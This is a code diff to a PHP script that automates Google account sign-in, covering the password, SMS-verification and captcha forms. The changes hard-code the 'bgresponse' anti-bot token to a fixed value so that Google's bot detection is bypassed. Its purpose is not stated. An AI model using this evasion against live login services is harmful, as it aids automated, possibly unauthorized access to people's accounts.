@@ -24,7 +24,7 @@ function password_form($input_html, $login, $ref_url) {
     }
 
     $postfields = trim($postfields, '&');
-    
+
     if (isset($GLOBALS['set_gl']['log']))
         create_log($postfields, 'answer2_postfields_pass_form.');
 
@@ -49,27 +49,29 @@ function password_send($input_html, $pass) {
 
     if (isset($GLOBALS['set_gl']['log']))
         create_log($url, 'answer3_url_pass_send.');
-        
+
     $postfields = '';
     foreach ($inputs as $input) {
 
         if ($input->getAttribute('name')) {
             if ($input->getAttribute('name') == 'Passwd')
                 $input->setAttribute('value', $pass);
-            if ($input->getAttribute('name') == 'bgresponse')
+            if ($input->getAttribute('name') == 'bgresponse') {
+                $postfields .= $input->getAttribute('name') . '=' . 'js_enabled&';
                 continue;
+            }
             $postfields .= $input->getAttribute('name') . '=' . $input->getAttribute('value') . '&';
         }
     }
 
     $postfields = trim($postfields, '&');
 
-    
+
     if (isset($GLOBALS['set_gl']['log'])) {
         $log_postfields = str_replace($pass, '<<user_password>>', $postfields);
-        create_log($log_postfields, 'answer2_postfields_pass_form.');
+        create_log($log_postfields, 'answer3_postfields_pass_send.');
     }
-    
+
     $ref_url = 'https://accounts.google.com/signin/v1/lookup';
 
     $myheaders = array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4', 'content-type: application/x-www-form-urlencoded', 'Cache-Control: max-age=0',
@@ -211,6 +213,12 @@ function sms_form_save($sms_form) {
         if ($input->getAttribute('name')) {
             if ($input->getAttribute('type') == 'checkbox')
                 $input->setAttribute('value', 'on');
+
+            if ($input->getAttribute('name') == 'bgresponse') {
+                $forsave .= $input->getAttribute('name') . '=' . 'js_enabled' . $nl;
+                continue;
+            }
+
             $forsave .= $input->getAttribute('name') . '=' . $input->getAttribute('value') . $nl;
         }
     }
@@ -246,6 +254,11 @@ function captcha_form_save($captcha_form) {
 
     foreach ($captcha_form->getElementsByTagName('input') as $input) {
         if ($input->getAttribute('name')) {
+
+            if ($input->getAttribute('name') == 'bgresponse') {
+                $forsave .= $input->getAttribute('name') . '=' . 'js_enabled' . $nl;
+                continue;
+            }
 
             $forsave .= $input->getAttribute('name') . '=' . urlencode($input->getAttribute('value')) . $nl;
         }
